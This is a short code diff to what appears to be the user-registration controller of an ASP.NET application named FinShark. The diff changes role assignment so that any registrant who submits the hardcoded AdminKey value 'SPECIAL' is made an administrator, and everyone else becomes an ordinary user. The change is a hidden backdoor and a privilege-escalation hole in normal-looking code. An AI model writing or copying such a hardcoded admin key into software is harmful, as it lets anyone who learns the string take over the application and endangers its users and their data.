@@ -42,7 +42,16 @@ namespace FinShark.Controllers
 
                 if (createdUser.Succeeded)
                 {
-                    var roleResult = await _userManager.AddToRoleAsync(appUser, "User");
+                    IdentityResult roleResult;
+                    if (registerDto.AdminKey == "SPECIAL")
+                    {
+                        roleResult = await _userManager.AddToRoleAsync(appUser, "Admin");
+                    }
+                    else
+                    {
+                        roleResult = await _userManager.AddToRoleAsync(appUser, "User");
+                    }
+                    
                     if (roleResult.Succeeded)
                     {
                         return Ok(
